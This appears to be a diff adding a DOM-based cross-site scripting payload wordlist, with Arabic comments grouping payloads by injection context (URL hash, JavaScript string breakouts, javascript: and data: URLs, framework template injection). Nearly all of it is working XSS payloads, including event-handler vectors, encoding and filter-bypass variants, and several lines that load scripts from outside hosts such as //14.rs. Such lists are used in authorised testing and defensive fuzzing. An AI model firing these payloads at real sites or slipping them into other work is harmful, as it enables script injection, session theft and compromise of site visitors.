@@ -1,0 +1,135 @@
+# This list we will using with list ( https://malekabuliala.github.io/List-s-me/list_Dom_XSS_Wordlis.txt ) In  DOM-Based XSS type ( The section follows the xss)
+
+# 1. حمولة الهاش الكلاسيكية (تجاوز السيرفر تماماً)
+#https://target.com/page.html#<img src=x onerror=alert(1)>
+# 2. حمولة كسر الـ JavaScript (Context Break)
+# (لو كان المدخل داخل كود JS)
+';alert(1);'
+"-alert(1)-"
+\';alert(1)//
+# 3. حمولة الـ "Protocol" (لو الموقع بياخذ رابط)
+javascript:alert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+# 4. حمولة الـ (Angular/React/Vue) لو الموقع بيستخدمهم
+{{constructor.constructor('alert(1)')()}}
+alert(1)
+alert(document.domain)
+confirm(1)
+prompt(1)
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg><script>alert(1)</script>
+<iframe src=javascript:alert(1)>
+" onmouseover="alert(1)
+' onfocus='alert(1)
+" autofocus onfocus=alert(1)
+');alert(1);//
+");alert(1);//
+`);alert(1);//
+data:text/html,<svg onload=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+</div><svg onload=alert(1)>
+onerror=alert(1)
+onload=alert(1)
+onclick=alert(1)
+onmouseenter=alert(1)
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+${alert(1)}
+{"x":"alert(1)"}
+alert?.(1)
+{"data":"<svg onload=alert(1)>"}
+<input name=innerHTML value="<svg onload=alert(1)>">
+<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>
+<svg/onload=alert`1`>
+<img src=x onerror=alert`1`>
+<iframe srcdoc="<svg onload=alert(1)>">
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+javascript:alert(document.domain)
+blob:text/html,<svg onload=alert(1)>
+<svg><set onbegin=alert(1) attributeName=x to=1>
+<video onloadeddata=alert(1)>
+<audio oncanplay=alert(1)>
+<input onpointerenter=alert(1)>
+<svg><foreignObject><div onload=alert(1)>
+top
+self
+Function('alert(1)')()
+this['constructor']['constructor']('alert(1)')()
+{"type":"x","data":"<svg onload=alert(1)>"}
+<form id=alert><input name=constructor value=alert></form>
+<div style=animation-name:x onanimationstart=alert(1)>
+</script><svg onload=alert(1)>
+{{alert(1)}}
+<svg><animate onbegin=alert(1)>
+<iframe srcdoc="<img src=x onerror=alert(1)>">
+<dialog open onclose=alert(1)>
+<form onsubmit=alert(1)><button autofocus>
+<input autofocus onfocus=alert(1)>
+<svg onresize=alert(1)>
+<svg><foreignObject onload=alert(1)>
+window
+`${top.alert(1)}`
+#<svg onload=alert(1)>
+#javascript:alert(1)
+</title><svg onload=alert(1)>
+</textarea><img src=x onerror=alert(1)>
+<style>@keyframes x{}</style><div style=animation:x onanimationstart=alert(1)>
+onpointerover=alert(1)
+onauxclick=alert(1)
+oncontextmenu=alert(1)
+"};alert(1);//
+'};alert(1);//
+</div><img src=x onerror=alert(1)>
+</span><svg onload=alert(1)>
+<math><mtext><svg onload=alert(1)>
+<img/src=x/onerror=alert`1`>
+${top.alert(1)}
+<isindex action=alert(1)>
+<plaintext><svg onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onbeforeunload=alert(1)>
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+<base href=javascript:alert(1)//>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<svg><desc onload=alert(1)>
+<svg><title onload=alert(1)>
+<math><mtext><img src=x onerror=alert(1)>
+onanimationiteration=alert(1)
+ontransitionrun=alert(1)
+javascript&#x3a;alert(1)
+jav&#97;script:alert(1)
+<svg
+onload=alert(1)>
+<img src=x
+onerror=alert(1)>
+<!--><svg onload=alert(1)>
+<img src=x src=y onerror=alert(1)>
+<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
+<d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
+<details open ontoggle=confirm()>
+<script y="><">/*<script* */prompt()</script
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<a href="javascript%26colon;alert(1)">click
+<a href=javas&#99;ript:alert(1)>click
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<svg/x=">"/onload=confirm()//
+<--`<img/src=` onerror=confirm``> --!>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg </onload ="1> (_=prompt,_(1)) "">
+<!--><script src=//14.rs>
+<embed src=//14.rs>
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe/src \/\/onload = prompt(1)
+<x oncut=alert()>x
+<svg onload=write()>
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+"><img src=foo.png onerror=alert(/d3rk😈/) />
+<body onload=alert('XSS')>
+<img src=x onerror=alert1>
